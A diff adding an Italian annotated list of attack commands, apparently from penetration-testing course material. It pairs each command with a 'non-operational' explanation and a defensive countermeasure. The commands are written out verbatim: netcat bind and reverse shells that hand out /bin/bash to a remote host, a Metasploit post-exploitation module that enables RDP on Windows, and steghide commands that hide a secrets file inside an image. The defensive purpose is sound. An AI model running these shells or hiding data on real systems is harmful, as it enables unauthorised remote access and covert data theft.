@@ -1,0 +1,79 @@
+1) nc -lvp 1234 -e /bin/bash
+   Descrizione (non-operativa):
+   - Riferimento a netcat usato per aprire una porta in ascolto e associare una shell al collegamento in ingresso (concetto: listener con shell remota).
+   Nota difensiva:
+   - Monitorare listener non autorizzati, bloccare porte non utilizzate con firewall, usare EDR/IDS per rilevare shell remote.
+
+2) nc -nv 192.168.78.6 1234
+   Descrizione (non-operativa):
+   - Richiama un tentativo di connessione client verso host/porta specifici (concetto: connessione verso un listener).
+   Nota difensiva:
+   - Applica egress filtering, registra connessioni in uscita e analizza anomalie verso host esterni.
+
+3) nc -lvp 1234 -e /bin/bash
+   Descrizione (non-operativa):
+   - Ripetizione del listener che associa una shell a una connessione entrante (stesso concetto della voce 1).
+   Nota difensiva:
+   - Vedi voce 1.
+
+4) nc -lvp 666
+   Descrizione (non-operativa):
+   - Apertura di un listener netcat su porta 666 (senza associare un comando specifico nella riga mostrata).
+   Nota difensiva:
+   - Tenere inventario dei servizi in ascolto; bloccare/indagare processi sospetti che aprono porte.
+
+5) nc 192.168.78.147 666 -e /bin/bash
+   Descrizione (non-operativa):
+   - Esempio di client che si connette a host/porta e fornisce una shell locale remota (concetto: canale per accesso shell).
+   Nota difensiva:
+   - Rilevazione di processi che eseguono connessioni shell remote, politiche di whitelist per esecuzione binari.
+
+6) nc -lvp 666
+   Descrizione (non-operativa):
+   - Ripetizione del listener su porta 666 (stesso concetto della voce 4).
+   Nota difensiva:
+   - Vedi voce 4.
+
+7) TrevorC2 Example
+   Descrizione (non-operativa):
+   - Testuale riferimento a un esempio di infrastruttura C2 (Command & Control) — concetto: server/architettura per controllo agenti remoti.
+   Nota difensiva:
+   - Monitorare beaconing C2, usare threat intelligence, segmentare rete e applicare DNS/URL filtering.
+
+8) msf > use post/windows/manage/enable_rdp
+   msf post(windows/manage/enable_rdp) > show options
+   Descrizione (non-operativa):
+   - Riferimento a un modulo post-exploitation che, concettualmente, permette di abilitare RDP su una macchina Windows; `show options` visualizza le impostazioni del modulo.
+   Nota difensiva:
+   - Audita modifiche di configurazione di accesso remoto, applica controllo di cambi GPO, usa MFA e firewall per RDP.
+
+9) $steghide --help
+   Descrizione (non-operativa):
+   - Invocazione dell'help di uno strumento di steganografia (mostra opzioni/usage). Concetto: tool per nascondere/estrarre dati in file multimediali.
+   Nota difensiva:
+   - Implementare DLP e scansione dei file, sospettare file multimediali usati per esfiltrazione.
+
+10) $cat secret.txt
+    Descrizione (non-operativa):
+    - Visualizzazione di un file di testo contenente dati (qui: “secret.txt” — concetto: contenuto sensibile che potrebbe essere poi nascosto o trasferito).
+    Nota difensiva:
+    - Proteggi file sensibili con permessi, cifratura e controllo accessi; log accessi e modifiche.
+
+11) $steghide embed -ef secret.txt -cf websploit-logo.jpg
+    Descrizione (non-operativa):
+    - Esempio concettuale di embedding: incorporare il contenuto di un file di testo dentro un file immagine (steganografia).
+    Nota difensiva:
+    - Controlli DLP, scanning per steganography se richiesto, policy su upload/download di file binari.
+
+12) $steghide extract -sf websploit-logo.jpg -xf extracted_data.txt
+    Descrizione (non-operativa):
+    - Estrazione concettuale di dati nascosti dentro un'immagine, salvando l'output in un file di testo.
+    Nota difensiva:
+    - Monitorare e analizzare file sospetti; processi di quarantena e ispezione su file ricevuti.
+
+13) $cat extracted_data.txt
+    Descrizione (non-operativa):
+    - Visualizzazione del file estratto da steganografia (controllo del contenuto recuperato).
+    Nota difensiva:
+    - Vedi voce 10 e 11: protezione dei dati sensibili, logging e policy DLP.
+
